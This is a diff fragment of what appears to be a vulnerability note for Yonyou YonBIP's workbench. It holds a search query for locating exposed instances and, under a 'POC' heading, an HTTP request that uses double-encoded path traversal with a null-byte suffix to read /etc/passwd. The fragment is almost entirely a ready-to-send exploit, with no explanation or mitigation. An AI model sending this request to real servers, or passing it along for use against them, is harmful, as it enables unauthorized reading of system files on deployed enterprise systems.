@@ -8,7 +8,7 @@ title="YonBIP" || title="数字化工作台"
 
 ![](https://cdn.nlark.com/yuque/0/2023/png/1622799/1699617335151-ab45cdc1-ba2a-4518-8a9d-5aa6a95e7263.png)
 
-## poc
+## POC
 ```plain
 GET /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js HTTP/1.1
 Host: 
